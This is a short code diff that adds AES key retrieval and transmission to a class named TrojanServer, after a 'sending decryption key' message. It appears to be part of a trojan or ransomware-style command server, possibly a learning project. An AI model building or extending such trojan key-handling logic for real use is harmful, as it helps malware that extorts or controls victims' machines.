@@ -135,6 +135,10 @@ class TrojanServer:
         
         msg = "sending decryption key"
         protocol.send(self.conn, msg)
+        
+        aes_key = self.retrieve_aes_key()
+        protocol.send(self.conn, aes_key)
+
 
 
 
